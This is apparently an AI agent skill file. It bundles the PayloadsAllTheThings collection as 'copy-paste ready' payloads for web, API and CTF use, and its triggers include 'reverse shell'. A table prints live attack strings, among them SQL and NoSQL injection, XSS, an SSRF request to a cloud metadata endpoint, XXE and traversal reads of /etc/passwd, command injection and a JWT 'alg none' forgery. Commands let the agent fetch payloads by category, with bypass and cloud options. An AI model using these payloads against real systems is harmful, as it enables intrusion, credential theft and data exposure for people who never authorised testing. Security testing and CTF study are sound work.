---
name: losthex-payloads
description: >-
  Ready-made payloads from PayloadsAllTheThings — 66 categories, copy-paste ready for web/API/CTF. Triggers: PayloadsAllTheThings, ready made payloads, copy paste payload, reverse shell, web payload list.
---
# LostHex-PAYLOADS — PayloadsAllTheThings (66 categories)

> **66 หมวด payload พร้อมใช้ — ก็อปแล้ววางได้เลย**
> Source: [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) (MIT) — bundled at `payloads/PayloadsAllTheThings/`

## Gate

```bash
python "$HOME/.workbuddy-ai/skills/losthex-hack/scripts/gate.py"  # optional — payloads work offline, no tools needed
```

## Categories (66)

| Category | Example |
|---|---|
| SQL Injection | `' OR 1=1-- -`, `1' UNION SELECT null-- -` |
| XSS Injection | `<svg onload=alert(1)>`, `"><img src=x onerror=alert(1)>` |
| SSRF | `http://169.254.169.254/latest/meta-data/` |
| XXE Injection | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| SSTI | `{{7*7}}`, `${7*7}` |
| Command Injection | `; id`, `| id`, `$(id)` |
| Directory Traversal | `../../../../etc/passwd` |
| Upload Insecure Files | `.phtml`, `php://filter/convert.base64-encode` |
| NoSQL Injection | `' || 'a'=='a`, `{"$gt":""}` |
| JWT | `{"alg":"none"}`, `kid` traversal |
| CORS / CSRF / Open Redirect / ... | ดูโฟลเดอร์ที่ตรงชื่อ |

→ รายชื่อเต็ม: `ls payloads/PayloadsAllTheThings/`

## How to use

```bash
# 1) Browse category folder directly
ls payloads/PayloadsAllTheThings/SQL* Injection/
cat "payloads/PayloadsAllTheThings/XSS Injection/README.md" | head -100

# 2) Via harness adapter
python ./scripts/harness.py --payload sqli
python ./scripts/harness.py --payload xss
python ./scripts/harness.py --payload ssrf

# 3) Ask in chat
/LostHex-PAYLOADS sqli
/LostHex-PAYLOADS xss --bypass
/LostHex-PAYLOADS ssrf --cloud aws
```

## Structure per category

```
payloads/PayloadsAllTheThings/<Category>/
  README.md   — vuln description + payloads + bypass
  Intruder/   — Burp Intruder wordlists (where available)
  Files/      — referenced files
  Images/     — screenshots
```

## CTF integration

`losthex-ctf-web` links to `payloads/PayloadsAllTheThings` via `pat-reference.md`:
```bash
cat skills/losthex-ctf-web/pat-reference.md
```

## Offline / no install needed

Payloads are bundled — read directly, no clone needed. To update:
```bash
git -C payloads/PayloadsAllTheThings pull
# or re-clone
rm -rf payloads/PayloadsAllTheThings
git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git payloads/PayloadsAllTheThings
```

Ponytail: Bulk payloads stay in payloads/ dir — technique files keep only exemplar payloads inline. See ctf-web/pat-reference.md for the bridge.